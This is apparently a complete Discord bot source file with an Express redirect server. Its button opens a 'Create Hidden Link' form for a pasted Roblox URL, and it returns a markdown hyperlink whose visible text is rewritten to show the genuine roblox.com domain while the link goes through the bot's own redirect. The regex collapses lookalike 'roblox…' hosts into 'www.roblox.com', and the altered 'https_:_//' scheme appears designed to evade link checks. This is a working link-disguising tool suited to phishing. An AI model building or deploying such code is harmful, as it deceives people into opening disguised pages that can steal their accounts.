require('dotenv').config();
const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  MessageFlags 
} = require('discord.js');

const express = require('express');
const app = express();

const client = new Client({ 
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
});

const linksDb = {};

// ====================== WEB SERVER ======================
app.get('/', (req, res) => res.send('Bot is active!'));

app.get('/r/:id', (req, res) => {
  const originalUrl = linksDb[req.params.id];
  console.log(`🔎 Redirect: ${req.params.id} → ${originalUrl}`);
  if (originalUrl) return res.redirect(originalUrl);
  res.status(404).send('Link not found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Web server on port ${PORT}`));

// ====================== DISCORD BOT ======================
client.once('ready', () => {
  console.log(`✅ Bot ${client.user.tag} is ready!`);
});

client.on('interactionCreate', async (interaction) => {
  const startTime = Date.now();

  // ==================== КНОПКА ====================
  if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
    console.log(`🟢 [${Date.now()}] Button pressed by ${interaction.user.tag} (${interaction.guild?.name || 'DM'})`);

    try {
      const modal = new ModalBuilder()
        .setCustomId('link_modal')
        .setTitle('Create Hidden Link');

      const input = new TextInputBuilder()
        .setCustomId('url_input')
        .setLabel('Paste Roblox link')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('https://www.roblox.com/...')
        .setRequired(true);

      modal.addComponents(new ActionRowBuilder().addComponents(input));

      await interaction.showModal(modal);
      console.log(`✅ [${Date.now() - startTime}ms] Modal shown successfully`);

    } catch (error) {
      console.error(`❌ [${Date.now() - startTime}ms] Error showing modal:`, error.message);
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ 
          content: '❌ Не удалось открыть форму. Попробуй ещё раз.', 
          flags: [MessageFlags.Ephemeral] 
        }).catch(() => {});
      }
    }
    return;
  }

  // ==================== МОДАЛКА ====================
  if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
    console.log(`📝 [${Date.now()}] Modal submitted by ${interaction.user.tag}`);

    try {
      const url = interaction.fields.getTextInputValue('url_input');
      const id = Math.random().toString(36).substring(7);
      linksDb[id] = url;

      const shortUrl = `${process.env.BASE_URL}/r/${id}`;
      const visualUrl = url
        .replace(/https?:\/\/(roblox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/')
        .replace('https://', 'https_:_//');

      await interaction.reply({ 
        content: '<a:verify:1513286049638518824> Check your DMs!', 
        flags: [MessageFlags.Ephemeral] 
      });

      // DM
      try {
        await interaction.user.send({
          embeds: [{
            color: 0x274666,
            title: '🔗 Hyperlink Generated',
            description: '👇 Your link is ready!\n\n🖱️ Click on the code block below to copy it'
          }]
        });

        await interaction.user.send({ content: `[\`${visualUrl}\`](${shortUrl})` });
        console.log(`✅ Link sent to DM for ${interaction.user.tag}`);
      } catch (dmError) {
        console.error('DM error:', dmError.message);
        await interaction.followUp({
          content: `⚠️ Не удалось отправить в ЛС. Вот ссылка: [\`${visualUrl}\`](${shortUrl})`,
          flags: [MessageFlags.Ephemeral]
        });
      }
    } catch (error) {
      console.error('Modal processing error:', error);
      await interaction.reply({ 
        content: '❌ Произошла ошибка при обработке ссылки.', 
        flags: [MessageFlags.Ephemeral] 
      }).catch(() => {});
    }
  }
});

client.login(process.env.TOKEN).catch(err => console.error('Login error:', err));
